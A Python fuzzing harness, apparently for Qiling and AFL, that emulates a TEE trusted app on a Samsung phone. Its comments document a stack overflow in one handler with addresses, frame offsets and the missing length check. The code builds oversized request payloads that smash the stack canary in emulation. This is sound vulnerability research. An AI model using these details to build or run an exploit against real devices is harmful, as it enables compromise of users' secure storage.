from .params import *
from qiling import Qiling
import struct, os

# === NEW BUG: vk_everyman_write_unsheltered stack overflow (vaultkeeper) =====
# Target: Samsung S24 Ultra (SM-S928B) VaultKeeper QTEE TA, vaultkeeper.ta.
# Handler: vk_everyman_write_unsheltered@0x12c1c (WRITE_UNSHELTERED, cmd 0xC000C07).
#
# Staging (see vaultkeeper_write.json): GP lifecycle stubbed; InvokeCommand points
# DIRECTLY at the handler @0x12c1c. Handler ABI on entry (from the framework's
# per-vault vtable dispatch inside process_vault_cmd):
#   x0 -> x21  (ctx/aux; null-checked @0x12c78, must be a valid ptr)
#   x1 -> x19  (the REQUEST descriptor; null-checked @0x12c7c)
#   x2 -> x20  (resp/aux; null-checked @0x12c80)
#
# Frame (0x12c1c): sub sp,#0x170; x29=sp+0x130.
#   dst buffer  = [x29-0x30]  (zeroed by stp q0,q0,[x29-0x30])  -- 40 bytes to the canary
#   stack canary= [x29-0x08]
#   saved x29   = [x29+0x00]   saved x30 = [x29+0x08]
#
# BUG (no upper clamp on an attacker length):
#   0x12c84 ldr w3,[x19,#4]; cmp #0x16; b.lo  -> floor (size >= 0x16) only
#   0x12f14 ldr w3,[x19,#0x28]; sub #0x21; cmn #0x21; b.hi 0x12fac
#            -> rejects ONLY len in [1..0x20]; len>=0x21 falls through (NO ceiling)
#   0x12fc8 ldr w2,[x19,#0x28]     ; len = req[+0x28]  (full u32, up to 4 GiB)
#   0x12fcc add x1,x19,#8          ; src = req+8       (attacker bytes)
#   0x12fd0 sub x0,x29,#0x30       ; dst = the 40-byte stack buffer
#   0x12fd4 bl  memcpy(dst, src, len)   <-- OVERFLOW when len > 0x28
#
# len > 0x28 corrupts the stack canary at fp-8; the epilogue (0x12e40 cmp; 0x12e44
# b.ne 0x13188 -> bl __stack_chk_fail@0x151b8 -> qsee_err_fatal) detects it and
# the emulator's qsee_err_fatal model calls crash() -> CRASH_PC (AFL crash).
# (len > 0x38 additionally overwrites saved x30, but the canary trips first.)
#
# DETECTION: canary mismatch -> qsee_err_fatal -> crash() (stack-smashing
# detected). So _end CAN be the worker's ret @0x12e60 (reached only on a benign
# len; a crashing len faults at the canary check BEFORE the ret).

AFL_EXIT     = 0x13370

STRUCT_BASE  = 0x53000000   # the request descriptor (x1 -> x19)
SRC_BASE     = STRUCT_BASE  # src = struct+8 (same region; +8 is inside the struct page)
CTX_BASE     = 0x53100000   # x0 -> x21 (ctx; must be non-null/mapped)
AUX_BASE     = 0x53200000   # x2 -> x20 (resp/aux; must be non-null/mapped)
REGION_SIZE  = 0x20000      # large enough that src+len stays mapped for the *read*

# default overflow size (> 0x28 to corrupt the canary). VK_WSIZE forces a value.
DEFAULT_SIZE = int(os.environ.get("VK_WSIZE", str(0x80)), 0) & 0xFFFFFFFF


def init_fuzz(emu, sid):
    ql = emu.ql
    for base, name in ((STRUCT_BASE, "struct/src"), (CTX_BASE, "ctx"), (AUX_BASE, "aux")):
        try:
            ql.mem.map(base, REGION_SIZE, info=f"[vkw] {name}")
        except Exception as e:
            ql.log.warning(f"[vkw] map {name} @ {hex(base)}: {e}")
    # AFL_EXIT landing pad (benign returns go to x30=0x13370; map it so the
    # return doesn't fault before the _end pivot/exit catches it).
    pad = 0x13370 & ~0xFFF
    try:
        ql.mem.map(pad, 0x1000, info="[vkw] AFL_EXIT pad")
        ql.mem.write(0x13370, b"\x00\x00\x00\x14")   # b . (self-loop)
    except Exception as e:
        ql.log.warning(f"[vkw] map AFL_EXIT pad: {e}")
    print(f"[vkw] init: struct@{hex(STRUCT_BASE)} ctx@{hex(CTX_BASE)} aux@{hex(AUX_BASE)}")


def _build_struct(size):
    # The descriptor: field[+4] = type/subcmd (must be >= 0x16 to pass 0x12c84),
    # field[+0x28] = copy length (the unbounded one), bytes from +8 = the source.
    s = bytearray(REGION_SIZE)
    struct.pack_into("<I", s, 0x04, 0x16)                 # [+4] >= 0x16 gate
    struct.pack_into("<I", s, 0x28, size & 0xFFFFFFFF)    # [+0x28] copy length (UNBOUNDED)
    # source bytes start at struct+8; fill with a recognizable pattern. The bytes
    # that land on the canary (fp-8) and saved x29/x30 are 'A' too, so a canary
    # mismatch is guaranteed for any size>0x28. Avoid clobbering the length field
    # at +0x28 with the pattern (re-stamp after).
    for i in range(8, min(REGION_SIZE, 8 + max(size, 0x40))):
        s[i] = 0x41
    struct.pack_into("<I", s, 0x04, 0x16)                 # re-stamp gate (in case overwritten)
    struct.pack_into("<I", s, 0x28, size & 0xFFFFFFFF)    # re-stamp length
    return bytes(s)


def place_input_callback(ql: Qiling, input: bytes, _: int):
    # AFL drives the copy size across [0 .. REGION_SIZE]; size > 0x28 overflows the
    # 40-byte stack buffer and corrupts the canary. (Floor: handler ignores
    # size < 0x21; size in [0x16..0x20] returns benign; >0x28 crashes.)
    size = DEFAULT_SIZE
    if "VK_WSIZE" not in os.environ:
        v = struct.unpack_from("<I", input, 0)[0] if len(input) >= 4 else 0
        size = v % (REGION_SIZE - 0x40)

    ql.mem.write(STRUCT_BASE, _build_struct(size))
    ql.mem.write(CTX_BASE, b"\x00" * 0x200)
    ql.mem.write(AUX_BASE, b"\x00" * 0x200)

    setup_params_fuzz(ql, 0, 0, [NoneParam(), NoneParam(), NoneParam(), NoneParam()])

    # vk_everyman_write_unsheltered(x0=ctx, x1=req_struct, x2=aux)
    ql.arch.regs.x0 = CTX_BASE
    ql.arch.regs.x1 = STRUCT_BASE
    ql.arch.regs.x2 = AUX_BASE
    ql.arch.regs.x30 = AFL_EXIT

    print(f"[vkw] WRITE_UNSHELTERED len=req[+0x28]={size:#x} "
          f"-> memcpy(stack[40], req+8, {size:#x}) (canary smash when len>0x28)")
    return True
